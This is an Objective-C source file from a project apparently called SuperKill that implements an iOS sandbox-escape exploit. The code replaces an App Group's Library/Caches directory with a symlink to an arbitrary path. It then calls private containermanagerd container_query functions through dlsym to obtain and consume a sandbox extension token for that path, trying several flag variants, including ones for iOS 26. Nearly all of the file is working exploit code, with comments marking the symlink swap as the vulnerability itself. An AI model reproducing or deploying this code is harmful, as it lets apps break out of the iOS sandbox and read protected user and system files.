//
//  worse_query.m
//  SuperKill
//
//  worse_query 原语的增强封装。相对上游的改动：
//    1. 自动枚举 flags × identifier 形态四种组合（iOS 26 的 AppGroup 需要 0x0800000000；
//       部分版本对 group identifiers 只接受 xpc array），不再由调用方判断系统版本。
//    2. 预检查区分 ENOENT 与 EPERM：沙盒不让 stat 的路径照样去试签发。
//    3. 补齐 container_* 的 dlsym 回退（dylib 打开失败时退到 RTLD_DEFAULT）。
//    4. 统一错误码 + 每次尝试后清理符号链接，不污染自己的 App Group 容器。
//

#import "worse_query.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <errno.h>
#import <stdlib.h>
#import <sys/stat.h>
#import <xpc/xpc.h>

typedef void    *(*cq_create_fn)(void);
typedef void     (*cq_set_class_fn)(void *, uint64_t);
typedef void     (*cq_set_group_ids_fn)(void *, xpc_object_t);
typedef void     (*cq_set_flags_fn)(void *, uint64_t);
typedef void     (*cq_set_part_fn)(void *, uint64_t);
typedef void    *(*cq_get_single_fn)(void *);
typedef void     (*cq_free_fn)(void *);
typedef char    *(*cq_copy_token_fn)(void *);
typedef int64_t  (*sbx_consume_fn)(const char *);
typedef int      (*sbx_release_fn)(int64_t);

// container_query 常量（与 containermanagerd 私有 ABI 对齐）
#define SK_CQ_CLASS_APP_GROUP      7ULL   // 只走 appGroup 类，才会 XPC 到 containermanagerd
#define SK_CQ_PART_LIBRARY_CACHES  3ULL   // part 3 == Library/Caches，也就是被我们换成符号链接的那一级
#define SK_CQ_FLAGS_DEFAULT        0x0000008000000000ULL
#define SK_CQ_FLAGS_IOS26_APPGROUP 0x0000000800000000ULL

static const char *const kContainerManagerPath = "/usr/lib/system/libsystem_containermanager.dylib";

static void *sk_sym(void *image, const char *name) {
    void *p = image ? dlsym(image, name) : NULL;
    if (!p) p = dlsym(RTLD_DEFAULT, name);
    return p;
}

BOOL sk_has_app_group(NSString *group) {
    if (group.length == 0) return NO;
    return [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group] != nil;
}

// 把 App Group 的 Library/Caches 恢复成真实目录。
static void sk_cleanup_symlink(NSString *group) {
    if (group.length == 0) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return;
    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];
    [fm removeItemAtPath:caches error:NULL];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:NULL];
}

static xpc_object_t sk_make_identifiers(NSString *group, bool as_array) {
    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    if (!as_array) return identifier;
    // 数组会 retain 元素；ARC 下不需要（也不允许）手工 release，最多泄漏一个短字符串。
    return xpc_array_create(&identifier, 1);
}

static int64_t sk_escape_once(NSString *target, NSString *group, uint64_t flags,
                              bool create_dir, bool array_ids) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0 && errno == ENOENT) {
            return -255; // 真的不存在
        }
        // EPERM / EACCES：沙盒不允许 stat 这个路径，但目标可能存在 —— 继续尝试签发。
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return -1;

    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    void *image = dlopen(kContainerManagerPath, RTLD_NOW | RTLD_LOCAL);

    cq_create_fn        create      = (cq_create_fn)sk_sym(image, "container_query_create");
    cq_set_class_fn     set_class   = (cq_set_class_fn)sk_sym(image, "container_query_set_class");
    cq_set_group_ids_fn set_ids     = (cq_set_group_ids_fn)sk_sym(image, "container_query_set_group_identifiers");
    cq_set_flags_fn     set_flags   = (cq_set_flags_fn)sk_sym(image, "container_query_operation_set_flags");
    cq_set_part_fn      set_part    = (cq_set_part_fn)sk_sym(image, "container_query_operation_set_part");
    cq_get_single_fn    get_single  = (cq_get_single_fn)sk_sym(image, "container_query_get_single_result");
    cq_free_fn          free_query  = (cq_free_fn)sk_sym(image, "container_query_free");
    cq_copy_token_fn    copy_token  = (cq_copy_token_fn)sk_sym(image, "container_copy_sandbox_token");
    sbx_consume_fn      consume     = (sbx_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!create || !set_class || !set_ids || !set_flags || !set_part ||
        !get_single || !free_query || !copy_token || !consume) {
        if (image) dlclose(image);
        return -2;
    }

    void *query = create();
    if (!query) {
        if (image) dlclose(image);
        return -3;
    }

    set_class(query, SK_CQ_CLASS_APP_GROUP);
    xpc_object_t identifiers = sk_make_identifiers(group, array_ids);
    set_ids(query, identifiers);
    set_part(query, SK_CQ_PART_LIBRARY_CACHES);
    set_flags(query, flags);

    // 把 Library/Caches 换成指向目标的符号链接——这一步是漏洞本体。
    [fm removeItemAtPath:caches error:NULL];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:NULL]) {
        free_query(query);
        if (image) dlclose(image);
        return -4;
    }

    int64_t result_code = 0;
    void *result = get_single(query);
    if (!result) {
        result_code = -5;
    } else {
        char *token = copy_token(result);
        if (!token) {
            result_code = -6;
        } else {
            int64_t handle = consume(token);
            free(token);
            result_code = (handle > 0) ? handle : -6;
        }
    }

    free_query(query);
    sk_cleanup_symlink(group);
    if (image) dlclose(image);
    return result_code;
}

int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used) {
    if (target.length == 0 || group.length == 0) return -1;
    if (!sk_has_app_group(group)) return -1;

    const uint64_t flags_order[2] = { SK_CQ_FLAGS_DEFAULT, SK_CQ_FLAGS_IOS26_APPGROUP };
    int64_t last = -2;

    for (int f = 0; f < 2; f++) {
        for (int a = 0; a < 2; a++) {
            int64_t handle = sk_escape_once(target, group, flags_order[f], create_dir, a == 1);
            if (handle > 0) {
                if (flags_used) *flags_used = (int64_t)flags_order[f];
                return handle;
            }
            last = handle;
            // 这些错误换参数也没意义，直接回。
            if (handle == -255 || handle == -1 || handle == -2 ||
                handle == -3 || handle == -4) {
                return handle;
            }
        }
    }
    return last;
}

void sk_escape_release(int64_t handle) {
    if (handle <= 0) return;
    sbx_release_fn release_ext = (sbx_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_ext) release_ext(handle);
}
